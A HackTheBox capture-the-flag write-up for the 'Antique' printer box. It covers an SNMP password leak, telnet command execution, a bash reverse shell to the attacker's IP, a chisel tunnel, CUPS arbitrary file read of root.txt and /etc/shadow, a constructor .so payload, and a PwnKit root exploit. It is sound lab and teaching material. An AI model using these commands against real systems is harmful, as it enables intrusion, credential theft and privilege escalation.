---
title: HTB: Antique
url: https://0xdf.gitlab.io/2022/05/03/htb-antique.html
date: 2022-05-03T09:00:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-antique, hackthebox, ctf, printer, nmap, jetdirect, telnet, python, snmp, snmpwalk, tunnel, chisel, cups, cve-2012-5519, hashcat, shadow, cve-2015-1158, pwnkit, shared-object, cve-2021-4034
---

![Antique](https://0xdfimages.gitlab.io/img/antique-cover.png)

Antique released non-competitively as part of HackTheBox’s Printer track. It’s a box simulating an old HP printer. I’ll start by leaking a password over SNMP, and then use that over telnet to connect to the printer, where there’s an exec command to run commands on the system. To escalate, I’ll abuse an old instance of CUPS print manager software to get file read as root, and get the root flag. In Beyond Root, I’ll look at two more CVEs, another CUPS one that didn’t work because no actual printers were attached, and PwnKit, which does work.

## Box Info

| Name | [Antique](https://hackthebox.com/machines/antique)  [Antique](https://hackthebox.com/machines/antique) [Play on HackTheBox](https://hackthebox.com/machines/antique) |
| --- | --- |
| Release Date | 27 Sep 2021 |
| Retire Date | 27 Sep 2021 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### TCP nmap

`nmap` finds only one open TCP ports, telnet (23):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.107
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-02 00:47 UTC
Nmap scan report for 10.10.11.107
Host is up (0.097s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds
oxdf@hacky$ nmap -p 23 -sCV -oA scans/nmap-tcpscripts 10.10.11.107
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-02 00:50 UTC
Nmap scan report for 10.10.11.107
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.80%I=7%D=5/2%Time=626F2AC3%P=x86_64-pc-linux-gnu%r(NULL,
SF:F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPass
...[snip]...
SF:rect\n\nPassword:\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.19 seconds

```

The string “JetDirect” jumps out as interesting in the telnet scan.

### Telnet - TCP 23

I’ll use `telnet` to connect to Antique and it returns a banner for HP JetDirect and a password prompt:

```

oxdf@hacky$ telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password:

```

Guessing the password admin closes the connection:

```

Password: admin
Invalid password
Connection closed by foreign host.

```

### UDP nmap

Given the last of any other paths on TCP, I’ll check back to a UDP scan. Scanning for UDP can be both slow and unreliable. I do find `-sV` to make the results more reliable (and probably slower), but even just looking a the top ten ports finds something interesting on Antique:

```

oxdf@hacky$ sudo nmap -sU --top-ports 10 -sV 10.10.11.107
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-02 10:22 UTC
Nmap scan report for 10.10.11.107
Host is up (0.090s latency).

PORT     STATE  SERVICE      VERSION
53/udp   closed domain
67/udp   closed dhcps
123/udp  closed ntp
135/udp  closed msrpc
137/udp  closed netbios-ns
138/udp  closed netbios-dgm
161/udp  open   snmp         SNMPv1 server (public)
445/udp  closed microsoft-ds
631/udp  closed ipp
1434/udp closed ms-sql-m

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds

```

SNMP (UDP 161) is responding.

### SNMP - UDP 161

Running `snmpwalk` on Antique will only return one entry:

```

oxdf@hacky$ snmpwalk -v 2c -c public 10.10.11.107
iso.3.6.1.2.1 = STRING: "HTB Printer"

```

However, this post on [Hacking Network Printers](http://www.irongeek.com/i.php?page=security/networkprinterhacking) suggests I can leak the password if I ask for a specific variable:

```

oxdf@hacky$ snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 

```

The blog post says that these are hex representations of each byte. I’ll recognize that the numbers at the start of the list are in the hex ASCII range (0x20 - 0x7e), even if that ones at the end don’t make sense in that context.

I’ll drop into a Python shell and save the numbers as `nums`:

```

oxdf@hacky$ python
Python 3.8.10 (default, Mar 15 2022, 12:22:08) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> nums = "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135"

```

`.split()` will break the string into an array of strings, splitting at the spaces:

```

>>> nums.split()
['50', '40', '73', '73', '77', '30', '72', '64', '40', '31', '32', '33', '21', '21', '31', '32', '33', '1', '3', '9', '17', '18', '19', '22', '23', '25', '26', '27', '30', '31', '33', '34', '35', '37', '38', '39', '42', '43', '49', '50', '51', '54', '57', '58', '61', '65', '74', '75', '79', '82', '83', '86', '90', '91', '94', '95', '98', '103', '106', '111', '114', '115', '119', '122', '123', '126', '130', '131', '134', '135']

```

I’ll use a Python list comprehension to loop over each item and apply the `int` function, converting each to a number, using base 16 to convert from hex:

```

>>> [int(x, 16) for x in nums.split()]
[80, 64, 115, 115, 119, 48, 114, 100, 64, 49, 50, 51, 33, 33, 49, 50, 51, 1, 3, 9, 23, 24, 25, 34, 35, 37, 38, 39, 48, 49, 51, 52, 53, 55, 56, 57, 66, 67, 73, 80, 81, 84, 87, 88, 97, 101, 116, 117, 121, 130, 131, 134, 144, 145, 148, 149, 152, 259, 262, 273, 276, 277, 281, 290, 291, 294, 304, 305, 308, 309]

```

Now I’ll want each converted to an ASCII character using `chr`:

```

>>> [chr(int(x, 16)) for x in nums.split()]
['P', '@', 's', 's', 'w', '0', 'r', 'd', '@', '1', '2', '3', '!', '!', '1', '2', '3', '\x01', '\x03', '\t', '\x17', '\x18', '\x19', '"', '#', '%', '&', "'", '0', '1', '3', '4', '5', '7', '8', '9', 'B', 'C', 'I', 'P', 'Q', 'T', 'W', 'X', 'a', 'e', 't', 'u', 'y', '\x82', '\x83', '\x86', '\x90', '\x91', '\x94', '\x95', '\x98', 'ă', 'Ć', 'đ', 'Ĕ', 'ĕ', 'ę', 'Ģ', 'ģ', 'Ħ', 'İ', 'ı', 'Ĵ', 'ĵ']
>>> ''.join([chr(int(x, 16)) for x in nums.split()])
'P@ssw0rd@123!!123\x01\x03\t\x17\x18\x19"#%&\'01345789BCIPQTWXaetuy\x82\x83\x86\x90\x91\x94\x95\x98ăĆđĔĕęĢģĦİıĴĵ'

```

I’ll use `''.join()` to combine the list of characters back into a single more readable string. Perhaps the password is “P@ssw0rd@123!!123”.

## Shell as lp

### Authenticated Telnet

I’ll try telnet again, this time with the potential password:

```

oxdf@hacky$ telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> 

```

It worked!

### Execution

The login message says that `?` will show the help. I’ll try that:

```

> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session

```

Most of it is about configuring the printer, but the last one, `exec` is very interesting for my purposes. I’ll try running `id`:

```

> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)

```

That’s execution!

### Reverse Shell

My go-to reverse shell is bash (see my video on how it works [here](https://www.youtube.com/watch?v=OjkVep2EIlw)). Given this is a printer, I’ll check if `bash` is on the box, and it is:

```

> exec which bash
/usr/bin/bash

```

I’ll start `nc` listening on my host using `nc -lnvp 443`, and the run the reverse shell on Antique:

```

> exec bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'

```

It just hangs, but at `nc` there’s a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.107 53188
bash: cannot set terminal process group (1014): Inappropriate ioctl for device
bash: no job control in this shell
lp@antique:~$ id 
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)

```

The `script` shell upgrade trick didn’t work for me (just messed up my terminal), but the Python one worked fine:

```

lp@antique:~$ python3 -c 'import pty;pty.spawn("bash")'
lp@antique:~$ ^Z
[1]+  Stopped                 nc -lnvp 444
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 444
            reset
reset: unknown terminal type unknown
Terminal type? screen
lp@antique:~$ ls
telnet.py  user.txt
lp@antique:~$ 

```

I can access `user.txt`:

```

lp@antique:~$ cat user.txt
aad6f75c************************

```

## Shell as root

### Enumeration

#### Home Directory

lp’s home directory is in a non-standard location:

```

lp@antique:~$ pwd
/var/spool/lpd

```

Regardless, it’s pretty empty:

```

lp@antique:~$ ls -la
ls -la
total 16
drwxr-xr-x 2 lp   lp   4096 Sep 27  2021 .
drwxr-xr-x 6 root root 4096 May 14  2021 ..
lrwxrwxrwx 1 lp   lp      9 May 14  2021 .bash_history -> /dev/null
-rwxr-xr-x 1 lp   lp   1959 Sep 27  2021 telnet.py
-rw------- 2 lp   lp     33 May  2 00:42 user.txt

```

`telnet.py` is the program that’s faking an HP telnet service. The process list (`ps auxww`) shows that script being run as lp, so not much value in looking to exploit it further:

```

lp          1024  0.0  0.2 239656 10920 ?        Sl   00:42   0:00 python3 /var/spool/lpd/telnet.py

```

#### Listening Services

There’s one other port listening on Antique besides telnet:

```

lp@antique:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1024/python3        
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -   

```

If I `nc` to that port and just put in some junk and hit enter, it returns a HTTP 400 Bad Request:

```

lp@antique:~$ nc 127.0.0.1 631
lasd
HTTP/1.0 400 Bad Request
Date: Mon, 02 May 2022 13:05:39 GMT
Server: CUPS/1.6
Content-Type: text/html; charset=utf-8
Content-Length: 346

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
        <TITLE>Bad Request - CUPS v1.6.1</TITLE>
        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
</HEAD>
<BODY>
<H1>Bad Request</H1>
<P></P>
</BODY>
</HTML>

```

If I `curl` that port, it returns a page:

```

lp@antique:~$ curl 127.0.0.1:631                      
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>                                                 
<HEAD>
        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
        <TITLE>Home - CUPS 1.6.1</TITLE>
        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
        <LINK REL="SHORTCUT ICON" HREF="/images/cups-icon.png" TYPE="image/png">
</HEAD>                                                           
<BODY>
<TABLE CLASS="page" SUMMARY="{title}"> 
...[snip]...

```

### CUPs / IPP

#### Tunnel

To get a better look at the page, I’ll set up a tunnel so I can access it from my host, using [Chisel](https://github.com/jpillora/chisel) (see [this post](/cheatsheets/chisel) for Chisel details). I’ll download the [latest release](https://github.com/jpillora/chisel/releases/tag/v1.7.7) from GitHub, decompress it, and start a Python webserver in that directory:

```

oxdf@hacky$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
--2022-05-02 13:21:41--  https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
Resolving github.com (github.com)... 140.82.113.4
Connecting to github.com (github.com)|140.82.113.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/31311037/ba3e7fe5-01fc-4b0c-b8eb-1b3a4c8eb61f?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220502%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220502T132141Z&X-Amz-Expires=300&X-Amz-Signature=71b61999ecaa294c3b7dec1489e6b6ffb2d943a271184c0de349c018c0f92cad&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=31311037&response-content-disposition=attachment%3B%20filename%3Dchisel_1.7.7_linux_amd64.gz&response-content-type=application%2Foctet-stream [following]
--2022-05-02 13:21:41--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/31311037/ba3e7fe5-01fc-4b0c-b8eb-1b3a4c8eb61f?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220502%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220502T132141Z&X-Amz-Expires=300&X-Amz-Signature=71b61999ecaa294c3b7dec1489e6b6ffb2d943a271184c0de349c018c0f92cad&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=31311037&response-content-disposition=attachment%3B%20filename%3Dchisel_1.7.7_linux_amd64.gz&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3234355 (3.1M) [application/octet-stream]
Saving to: ‘chisel_1.7.7_linux_amd64.gz’

chisel_1.7.7_linux_amd64.gz                                                     100%[====================================================================================================================================================================================================>]   3.08M  9.65MB/s    in 0.3s    

2022-05-02 13:21:41 (9.65 MB/s) - ‘chisel_1.7.7_linux_amd64.gz’ saved [3234355/3234355]
oxdf@hacky$ gunzip chisel_1.7.7_linux_amd64.gz 
oxdf@hacky$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

From Antique, I’ll fetch the binary:

```

lp@antique:/dev/shm$ wget 10.10.14.6/chisel_1.7.7_linux_amd64              
wget 10.10.14.6/chisel_1.7.7_linux_amd64                                   
--2022-05-02 13:23:19--  http://10.10.14.6/chisel_1.7.7_linux_amd64        
Connecting to 10.10.14.6:80... connected.                                  
HTTP request sent, awaiting response... 200 OK                             
Length: 8077312 (7.7M) [application/octet-stream]                            
Saving to: ‘chisel_1.7.7_linux_amd64’                                      

     0K .......... .......... .......... .......... ..........  0%  268K 29s
...[snip]...
  7800K .......... .......... .......... .......... .......... 99% 2.52M 0s
  7850K .......... .......... .......... ........             100% 1.37M=2.8s

2022-05-02 13:23:22 (2.78 MB/s) - ‘chisel_1.7.7_linux_amd64’ saved [8077312/8077312]

```

On my host, I’ll run the same binary as the server:

```

oxdf@hacky$ ./chisel_1.7.7_linux_amd64 server -p 9000 --reverse
2022/05/02 13:29:45 server: Reverse tunnelling enabled
2022/05/02 13:29:45 server: Fingerprint nAhajozV41EjYejrhftqY6829U+uzLWqa/ESPyvCIFM=
2022/05/02 13:29:45 server: Listening on http://0.0.0.0:9000

```

`-p 9000` sets that as the port to listen on (any port will do, but the default is 8080, which Burp is already using on my host), and `--reverse` allows for reverse tunnels, so that a client can open a listening port on my VM.

Now I’ll connect to it from Antique:

```

lp@antique:/dev/shm$ chmod +x chisel_1.7.7_linux_amd64
lp@antique:/dev/shm$ ./chisel_1.7.7_linux_amd64 client 10.10.14.6:9000 R:9631:localhost:631                                              
<x_amd64 client 10.10.14.6:9000 R:9631:localhost:631
2022/05/02 13:30:16 client: Connecting to ws://10.10.14.6:9000
2022/05/02 13:30:17 client: Connected (Latency 90.506923ms)

```

This tells `chisel` to connect to my VM on 9000, and to create a listening on my VM on 9631 (I can’t use ports under 1024 because I didn’t run the server as root). Any traffic that hits that listening port will be forwarded by `chisel` to Antique and then send to port 631 on Antique from Antique.

On my host, pointing Firefox at `localhost:9631` loads the page.

#### Page

The page is a CUPS page:

![image-20220502093143737](https://0xdfimages.gitlab.io/img/image-20220502093143737.png)

[CUPS](http://www.cups.org/) is an open-source printing system.

The “Administration” tab shows the printers that are connected (none), as well as jobs, classes, and other bits of administrative information.

![image-20220502100304702](https://0xdfimages.gitlab.io/img/image-20220502100304702.png)

The “Server” section has links to show various logs. If I try to edit and save the configuration file, it pops asking for auth, which I don’t have.

In the error log, I can see the request I made earlier:

![image-20220502100408767](https://0xdfimages.gitlab.io/img/image-20220502100408767.png)

### CVE-2012-5519

#### Background

Some Goolging for vulnerabilities in CUPs returns CVE-2012-5519, file read as root in CUPS 1.6.1, which matches the version here.

[This article](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read) does a really nice job of both showing how to run the Metasploit module, and breaking down how it might fail.

Looking at [the exploit source](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/multi/escalate/cups_root_file_read.rb), it’s using `cupsctl` (saved in the `ctl_path` variable) in a current session to set the error log to a different file (`datastore['FILE']`):

```

cmd_exec("#{ctl_path} ErrorLog=#{datastore['FILE']}")

```

#### Read Flag

The first thing I can do is get `root.txt`. I’ll set it as the error log:

```

lp@antique:~$ cupsctl ErrorLog=/root/root.txt

```

Now I’ll just request that same URL:

```

lp@antique:~$ curl 127.0.0.1:631/admin/log/error_log?
b7d0a7d5ede96350d003e590c241cdc9

```

It works!

#### Shell Failures

I am able to read `/etc/shadow` to get the hashes of users on the filesystem:

```

lp@antique:/dev/shm$ cupsctl ErrorLog=/etc/shadow
lp@antique:/dev/shm$ curl 127.0.0.1:631/admin/log/error_log?
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
...[snip]...

```

The only user with a hash is root. I can try to crack it using `hashcat`, putting that full line into a file (`hash`), and running:

```

$ /opt/hashcat-6.2.5/hashcat.bin hash /usr/share/wordlists/rockyou.txt --user

```

To run all of `rockyou.txt` will take over 8 hours, and it won’t find the password.

I’ll also check to see if there’s an SSH key in `/root/.ssh/id_rsa`, but the file doesn’t exist:

```

lp@antique:/dev/shm$ cupsctl ErrorLog=/root/.ssh/id_rsa
lp@antique:/dev/shm$ curl 127.0.0.1:631/admin/log/error_log?
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
        <TITLE>Not Found - CUPS v1.6.1</TITLE>
        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
</HEAD>
<BODY>
<H1>Not Found</H1>
<P></P>
</BODY>
</HTML>

```

I will get a shell an unintended way in [Beyond Root](#pwnkit).

## Beyond Root

### CVE-2015-1158

In Googling for CUPS vulnerabilities, I’ll come across CVE-2015-1158, which is remote code execution in CUPS < 2.0.3, which could very well include 1.6.1.

[This script](https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py) is a POC, so I’ll give it a try.

Downloading it, it’s a Python2 script, and it takes a host, a port, and a library to run:

```

oxdf@hacky$ python2 cve-2015-1158.py             ...[snip]...
python script.py <args>
   -h, --help:             Show this message
   -a, --rhost:            Target IP address
   -b, --rport:            Target IPP service port
   -c, --lib               /path/to/payload.so
   -f, --stomp-only        Only stomp the ACL (no postex)

Examples:
python script.py -a 10.10.10.10 -b 631 -f
python script.py -a 10.10.10.10 -b 631 -c /tmp/x86reverseshell.so

```

I’ll create a simple `.so` file:

```

#include<stdio.h>
#include<stdlib.h>

void __attribute__((constructor)) evil();

void main() {};

void evil() {
    system("touch /0xdf");
}

```

If this works, it will create a file at the filesystem root.

I’ll compile it:

```

oxdf@hacky$ gcc -shared -o so.so -fPIC so.c 

```

And upload it to Antique using a Python webserver on my host and `wget` on Antique. Now, I’ll run the exploit through the tunnel:

```

oxdf@hacky$ python2 cve-2015-1158.py -a 127.0.0.1 -b 9631 -c /tmp/so.so
...[snip]...
[*]     locate available printer
[-]     no printers

```

It fails because there are no printers available (something I noted above in the admin website).

### PwnKit

#### Find Vulnerable

Something like [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) will identify this host is vulnerable. This [post from Datadog](https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/) shows how to manually check by running `dpkg -s policykit-1`:

```

lp@antique:/dev/shm$ dpkg -s policykit-1
Package: policykit-1
Status: install ok installed
Priority: optional
Section: admin
Installed-Size: 560
Maintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>
Architecture: amd64
Multi-Arch: foreign
Version: 0.105-26ubuntu1.1
Depends: dbus, libpam-systemd, libc6 (>= 2.7), libexpat1 (>= 2.0.1), libglib2.0-0 (>= 2.37.3), libpam0g (>= 0.99.7.1), libpolkit-agent-1-0 (= 0.105-26ubuntu1.1), libpolkit-gobject-1-0 (= 0.105-26ubuntu1.1), libsystemd0 (>= 213)
Conffiles:
 /etc/pam.d/polkit-1 7c794427f656539b0d4659b030904fe0
 /etc/polkit-1/localauthority.conf.d/50-localauthority.conf 2adb9d174807b0a3521fabf03792fbc8
 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf c4dbd2117c52f367f1e8b8c229686b10
Description: framework for managing administrative policies and privileges
 PolicyKit is an application-level toolkit for defining and handling the policy
 that allows unprivileged processes to speak to privileged processes.
 .
 It is a framework for centralizing the decision making process with respect to
 granting access to privileged operations for unprivileged (desktop)
 applications.
Homepage: https://www.freedesktop.org/wiki/Software/polkit/
Original-Maintainer: Utopia Maintenance Team <pkg-utopia-maintainers@lists.alioth.debian.org>

```

The important line is:

```

Version: 0.105-26ubuntu1.1

```

According to this table from the Datadog post, that’s the last vulnerable version on Ubuntu 20.04 focal:

![image-20220502102910695](https://0xdfimages.gitlab.io/img/image-20220502102910695.png)

#### Exploit

This box is actually vulnerable to [PwnKit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034). I’ll download a POC exploit (I like this one from Joe Ammond [here](https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py)), and upload it to Antique. From there, it’s as simple as running the script:

```

lp@antique:/dev/shm$ python3 CVE-2021-4034.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# id
uid=0(root) gid=7(lp) groups=7(lp),19(lpadmin)

```